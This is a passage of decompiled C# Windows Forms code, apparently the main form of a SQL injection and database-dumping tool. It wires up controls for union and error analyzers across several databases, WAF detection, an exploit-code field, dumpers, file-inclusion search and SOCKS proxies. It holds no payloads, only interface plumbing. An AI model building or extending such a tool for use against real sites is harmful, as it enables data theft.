			NumericUpDown numericUpDown = _numAnalizerUnionSart;
			if (numericUpDown != null)
			{
				numericUpDown.ValueChanged -= value2;
			}
			_numAnalizerUnionSart = value;
			numericUpDown = _numAnalizerUnionSart;
			if (numericUpDown != null)
			{
				numericUpDown.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblSQLiUnionCount")]
	internal virtual Label lblSQLiUnionCount
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkAnalizerMySQLErrorUnion")]
	internal virtual CheckBox chkAnalizerMySQLErrorUnion
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkAnalizeWAF")]
	internal virtual CheckBox chkAnalizeWAF
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkAnalizerMSSQLErrorUnion")]
	internal virtual CheckBox chkAnalizerMSSQLErrorUnion
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage1")]
	internal virtual TabPage TabPage1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage2")]
	internal virtual TabPage TabPage2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage3")]
	internal virtual TabPage TabPage3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual CheckedListBox lstAnalizerUnion
	{
		[CompilerGenerated]
		get
		{
			return _lstAnalizerUnion;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_93;
			CheckedListBox checkedListBox = _lstAnalizerUnion;
			if (checkedListBox != null)
			{
				checkedListBox.Leave -= value2;
			}
			_lstAnalizerUnion = value;
			checkedListBox = _lstAnalizerUnion;
			if (checkedListBox != null)
			{
				checkedListBox.Leave += value2;
			}
		}
	}

	internal virtual CheckedListBox lstAnalizerError
	{
		[CompilerGenerated]
		get
		{
			return _lstAnalizerError;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_93;
			CheckedListBox checkedListBox = _lstAnalizerError;
			if (checkedListBox != null)
			{
				checkedListBox.Leave -= value2;
			}
			_lstAnalizerError = value;
			checkedListBox = _lstAnalizerError;
			if (checkedListBox != null)
			{
				checkedListBox.Leave += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblSQLiExploitCode")]
	internal virtual Label lblSQLiExploitCode
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox txtAnalizerExploitCode
	{
		[CompilerGenerated]
		get
		{
			return _txtAnalizerExploitCode;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_94;
			EventHandler value3 = method_110;
			TextBox textBox = _txtAnalizerExploitCode;
			if (textBox != null)
			{
				textBox.Leave -= value2;
				textBox.TextChanged -= value3;
			}
			_txtAnalizerExploitCode = value;
			textBox = _txtAnalizerExploitCode;
			if (textBox != null)
			{
				textBox.Leave += value2;
				textBox.TextChanged += value3;
			}
		}
	}

	[field: AccessedThroughProperty("pnlSQLi")]
	internal virtual Panel pnlSQLi
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tsSQLi")]
	internal virtual ToolStrip tsSQLi
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cmbSQLiSearch")]
	internal virtual ToolStripComboBox cmbSQLiSearch
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnSQLiSearchClear
	{
		[CompilerGenerated]
		get
		{
			return _btnSQLiSearchClear;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_172;
			ToolStripButton toolStripButton = _btnSQLiSearchClear;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnSQLiSearchClear = value;
			toolStripButton = _btnSQLiSearchClear;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	internal virtual ToolStripButton btnSQLiSearch
	{
		[CompilerGenerated]
		get
		{
			return _btnSQLiSearch;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_172;
			ToolStripButton toolStripButton = _btnSQLiSearch;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnSQLiSearch = value;
			toolStripButton = _btnSQLiSearch;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator12")]
	internal virtual ToolStripSeparator ToolStripSeparator12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblSQLi")]
	internal virtual ToolStripLabel lblSQLi
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pnlSQLiNoInjectable")]
	internal virtual Panel pnlSQLiNoInjectable
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tsSQLiNoInjectable")]
	internal virtual ToolStrip tsSQLiNoInjectable
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cmbSQLiNoInjectableSearch")]
	internal virtual ToolStripComboBox cmbSQLiNoInjectableSearch
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnSQLiNoInjectableSearchClear
	{
		[CompilerGenerated]
		get
		{
			return _btnSQLiNoInjectableSearchClear;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_172;
			ToolStripButton toolStripButton = _btnSQLiNoInjectableSearchClear;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnSQLiNoInjectableSearchClear = value;
			toolStripButton = _btnSQLiNoInjectableSearchClear;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	internal virtual ToolStripButton btnSQLiNoInjectableSearch
	{
		[CompilerGenerated]
		get
		{
			return _btnSQLiNoInjectableSearch;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_172;
			ToolStripButton toolStripButton = _btnSQLiNoInjectableSearch;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnSQLiNoInjectableSearch = value;
			toolStripButton = _btnSQLiNoInjectableSearch;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator13")]
	internal virtual ToolStripSeparator ToolStripSeparator13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblSQLiNoInjectable")]
	internal virtual ToolStripLabel lblSQLiNoInjectable
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pnlSQLiDumper")]
	internal virtual Panel pnlSQLiDumper
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnSocksMyIP
	{
		[CompilerGenerated]
		get
		{
			return _btnSocksMyIP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_96;
			ToolStripButton toolStripButton = _btnSocksMyIP;
			if (toolStripButton != null)
			{
				toolStripButton.CheckedChanged -= value2;
			}
			_btnSocksMyIP = value;
			toolStripButton = _btnSocksMyIP;
			if (toolStripButton != null)
			{
				toolStripButton.CheckedChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("tsSearchColumn")]
	internal virtual ToolStrip tsSearchColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("btnSearchColumnStart")]
	internal virtual ToolStripButton btnSearchColumnStart
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkSearchColumnAllDBs")]
	internal virtual ToolStripButton chkSearchColumnAllDBs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripComboBox cmbSearchColumn
	{
		[CompilerGenerated]
		get
		{
			return _cmbSearchColumn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_176;
			ToolStripComboBox toolStripComboBox = _cmbSearchColumn;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.Leave -= value2;
			}
			_cmbSearchColumn = value;
			toolStripComboBox = _cmbSearchColumn;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.Leave += value2;
			}
		}
	}

	internal virtual ContextMenuStrip mnuSearchColumn
	{
		[CompilerGenerated]
		get
		{
			return _mnuChecked_9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			CancelEventHandler value2 = method_177;
			ContextMenuStrip mnuChecked_ = _mnuChecked_9;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening -= value2;
			}
			_mnuChecked_9 = value;
			mnuChecked_ = _mnuChecked_9;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuSearchColumnClear
	{
		[CompilerGenerated]
		get
		{
			return _mnuSearchColumnClear;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_180;
			ToolStripMenuItem toolStripMenuItem = _mnuSearchColumnClear;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuSearchColumnClear = value;
			toolStripMenuItem = _mnuSearchColumnClear;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuSearchColumnRem
	{
		[CompilerGenerated]
		get
		{
			return _mnuSearchColumnRem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_179;
			ToolStripMenuItem toolStripMenuItem = _mnuSearchColumnRem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuSearchColumnRem = value;
			toolStripMenuItem = _mnuSearchColumnRem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuLWGoDumper
	{
		[CompilerGenerated]
		get
		{
			return _mnuLWGoDumper;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_164;
			ToolStripMenuItem toolStripMenuItem = _mnuLWGoDumper;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLWGoDumper = value;
			toolStripMenuItem = _mnuLWGoDumper;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuLWGoNewDumper
	{
		[CompilerGenerated]
		get
		{
			return _mnuLWGoNewDumper;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_163;
			ToolStripMenuItem toolStripMenuItem = _mnuLWGoNewDumper;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLWGoNewDumper = value;
			toolStripMenuItem = _mnuLWGoNewDumper;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuLWGoNewDumperSP")]
	internal virtual ToolStripSeparator mnuLWGoNewDumperSP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuLWGoFileDumper
	{
		[CompilerGenerated]
		get
		{
			return _mnuLWGoFileDumper;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_166;
			ToolStripMenuItem toolStripMenuItem = _mnuLWGoFileDumper;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLWGoFileDumper = value;
			toolStripMenuItem = _mnuLWGoFileDumper;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuDownloads")]
	internal virtual ContextMenuStrip mnuDownloads
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuDownloadsClear
	{
		[CompilerGenerated]
		get
		{
			return _mnuDownloadsClear;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_211;
			ToolStripMenuItem toolStripMenuItem = _mnuDownloadsClear;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuDownloadsClear = value;
			toolStripMenuItem = _mnuDownloadsClear;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripComboBox txtFileInclusaoSearch
	{
		[CompilerGenerated]
		get
		{
			return _txtFileInclusaoSearch;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			KeyPressEventHandler value2 = method_171;
			ToolStripComboBox toolStripComboBox = _txtFileInclusaoSearch;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.KeyPress -= value2;
			}
			_txtFileInclusaoSearch = value;
			toolStripComboBox = _txtFileInclusaoSearch;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.KeyPress += value2;
			}
		}
	}

	internal virtual ToolStripComboBox txtSQLiNoInjectableSearch
	{
		[CompilerGenerated]
		get
		{
			return _txtSQLiNoInjectableSearch;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			KeyPressEventHandler value2 = method_171;
			ToolStripComboBox toolStripComboBox = _txtSQLiNoInjectableSearch;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.KeyPress -= value2;
			}
			_txtSQLiNoInjectableSearch = value;
			toolStripComboBox = _txtSQLiNoInjectableSearch;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.KeyPress += value2;
			}
		}
	}

	internal virtual ToolStripComboBox txtSQLiSearch
	{
		[CompilerGenerated]
		get
		{
			return _txtSQLiSearch;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			KeyPressEventHandler value2 = method_171;
			ToolStripComboBox toolStripComboBox = _txtSQLiSearch;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.KeyPress -= value2;
			}
			_txtSQLiSearch = value;
			toolStripComboBox = _txtSQLiSearch;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.KeyPress += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblSocksCount")]
	internal virtual ToolStripLabel lblSocksCount
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuLWAutoScroll
	{
		[CompilerGenerated]
		get
		{
			return _mnuLWAutoScroll;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_170;
			ToolStripMenuItem toolStripMenuItem = _mnuLWAutoScroll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLWAutoScroll = value;
			toolStripMenuItem = _mnuLWAutoScroll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuQueueTrash
	{
		[CompilerGenerated]
		get
		{
			return _mnuQueueTrash;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_155;
			ToolStripMenuItem toolStripMenuItem = _mnuQueueTrash;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuQueueTrash = value;
			toolStripMenuItem = _mnuQueueTrash;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuLWTrash
	{
		[CompilerGenerated]
		get
		{
			return _mnuLWTrash;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_168;
			ToolStripMenuItem toolStripMenuItem = _mnuLWTrash;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLWTrash = value;
			toolStripMenuItem = _mnuLWTrash;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuLWAutoScrollSP")]
	internal virtual ToolStripSeparator mnuLWAutoScrollSP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuLWSelected")]
	internal virtual ToolStripMenuItem mnuLWSelected
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkAnalizerOracleErrorUnion")]
	internal virtual CheckBox chkAnalizerOracleErrorUnion
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkAnalizerPostgreErrorUnion")]
	internal virtual CheckBox chkAnalizerPostgreErrorUnion
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkAnalizeMsAcessSybase")]
	internal virtual CheckBox chkAnalizeMsAcessSybase
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuHttpLogShell
	{
		[CompilerGenerated]
		get
		{
			return _mnuHttpLogShell;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_203;
			ToolStripMenuItem toolStripMenuItem = _mnuHttpLogShell;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuHttpLogShell = value;
			toolStripMenuItem = _mnuHttpLogShell;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuHttpLogClipboard
	{
		[CompilerGenerated]
		get
		{
			return _mnuHttpLogClipboard;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_202;
			ToolStripMenuItem toolStripMenuItem = _mnuHttpLogClipboard;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuHttpLogClipboard = value;
			toolStripMenuItem = _mnuHttpLogClipboard;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("pnlTools")]
	internal virtual Panel pnlTools
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnPing
	{
		[CompilerGenerated]
		get
		{
			return _btnPing;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_140;
			Button button = _btnPing;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnPing = value;
			button = _btnPing;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("grbToolsIP")]
	internal virtual GroupBox grbToolsIP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnResolve
	{
		[CompilerGenerated]
		get
		{
			return _btnResolve;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_142;
			Button button = _btnResolve;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnResolve = value;
			button = _btnResolve;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("txtResolveCountry")]
	internal virtual TextBox txtResolveCountry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtResolveIP")]
	internal virtual TextBox txtResolveIP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("picResolveFlag")]
	internal virtual PictureBox picResolveFlag
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblToolsIPAddress")]
	internal virtual Label lblToolsIPAddress
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblToolsIP")]
	internal virtual Label lblToolsIP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblToolsIPCountry")]
	internal virtual Label lblToolsIPCountry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox txtResolveAddress
	{
		[CompilerGenerated]
		get
		{
			return _txtResolveAddress;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_141;
			TextBox textBox = _txtResolveAddress;
			if (textBox != null)
			{
				textBox.TextChanged -= value2;
			}
			_txtResolveAddress = value;
			textBox = _txtResolveAddress;
			if (textBox != null)
			{
				textBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("numPingPort")]
	internal virtual NumericUpDown numPingPort
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cmbSQLChar")]
	internal virtual ComboBox cmbSQLChar
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox txtSQLCharDelimiter
	{
		[CompilerGenerated]
		get
		{
			return _txtSQLCharDelimiter;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_139;
			TextBox textBox = _txtSQLCharDelimiter;
			if (textBox != null)
			{
				textBox.TextChanged -= value2;
			}
			_txtSQLCharDelimiter = value;
			textBox = _txtSQLCharDelimiter;
			if (textBox != null)
			{
				textBox.TextChanged += value2;
			}
		}
	}

	internal virtual TextBox txtTextValue
	{
		[CompilerGenerated]
		get
		{
			return _txtTextValue;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_129;
			TextBox textBox = _txtTextValue;
			if (textBox != null)
			{
				textBox.TextChanged -= value2;
			}
			_txtTextValue = value;
			textBox = _txtTextValue;
			if (textBox != null)
			{
				textBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("txtSQLCharValue")]
	internal virtual TextBox txtSQLCharValue
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblToolsConverSQLChar")]
	internal virtual Label lblToolsConverSQLChar
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblToolsConvertTextValue")]
	internal virtual Label lblToolsConvertTextValue
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnConvertTextToHex
	{
		[CompilerGenerated]
		get
		{
			return _btnConvertTextToHex;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_135;
			Button button = _btnConvertTextToHex;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnConvertTextToHex = value;
			button = _btnConvertTextToHex;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual TextBox txtHexValue
	{
		[CompilerGenerated]
		get
		{
			return _txtHexValue;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_130;
			TextBox textBox = _txtHexValue;
			if (textBox != null)
			{
				textBox.TextChanged -= value2;
			}
			_txtHexValue = value;
			textBox = _txtHexValue;
			if (textBox != null)
			{
				textBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblToolsConvertHexValue")]
	internal virtual Label lblToolsConvertHexValue
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnHexToText
	{
		[CompilerGenerated]
		get
		{
			return _btnHexToText;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_136;
			Button button = _btnHexToText;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnHexToText = value;
			button = _btnHexToText;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual CheckBox chkGroupChar
	{
		[CompilerGenerated]
		get
		{
			return _chkGroupChar;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_138;
			CheckBox checkBox = _chkGroupChar;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= value2;
			}
			_chkGroupChar = value;
			checkBox = _chkGroupChar;
			if (checkBox != null)
			{
				checkBox.CheckedChanged += value2;
			}
		}
	}

	internal virtual Button butTextToSQLChar
	{
		[CompilerGenerated]
		get
		{
			return _butTextToSQLChar;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_137;
			Button button = _butTextToSQLChar;
			if (button != null)
			{
				button.Click -= value2;
			}
			_butTextToSQLChar = value;
			button = _butTextToSQLChar;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("grbToolsConvertEnc")]
	internal virtual GroupBox grbToolsConvertEnc
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnURLDecondingToText
	{
		[CompilerGenerated]
		get
		{
			return _btnURLDecondingToText;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_132;
			Button button = _btnURLDecondingToText;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnURLDecondingToText = value;
			button = _btnURLDecondingToText;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button btnTextToURLEnconding
	{
		[CompilerGenerated]
		get
		{
			return _btnTextToURLEnconding;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_131;
			Button button = _btnTextToURLEnconding;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnTextToURLEnconding = value;
			button = _btnTextToURLEnconding;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button btnBase64ToText
	{
		[CompilerGenerated]
		get
		{
			return _btnBase64ToText;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_134;
			Button button = _btnBase64ToText;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnBase64ToText = value;
			button = _btnBase64ToText;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button btnTextToBase64
	{
		[CompilerGenerated]
		get
		{
			return _btnTextToBase64;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_133;
			Button button = _btnTextToBase64;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnTextToBase64 = value;
			button = _btnTextToBase64;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblToolsIPport")]
	internal virtual Label lblToolsIPport
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnToolsClean
	{
		[CompilerGenerated]
		get
		{
			return _btnToolsClean;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_128;
			Button button = _btnToolsClean;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnToolsClean = value;
			button = _btnToolsClean;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("grbScanner")]
	internal virtual GroupBox grbScanner
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lvwScannerDomain")]
	internal virtual ListViewExt lvwScannerDomain
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ColumnHeader ColumnHeader32
	{
		[CompilerGenerated]
		get
		{
			return columnHeader_6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			columnHeader_6 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader33
	{
		[CompilerGenerated]
		get
		{
			return columnHeader_7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			columnHeader_7 = value;
		}
	}

	internal virtual ContextMenuStrip mnuScannerDomain
	{
		[CompilerGenerated]
		get
		{
			return _mnuChecked_8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			CancelEventHandler value2 = method_99;
			ContextMenuStrip mnuChecked_ = _mnuChecked_8;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening -= value2;
			}
			_mnuChecked_8 = value;
			mnuChecked_ = _mnuChecked_8;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening += value2;
			}
		}
	}

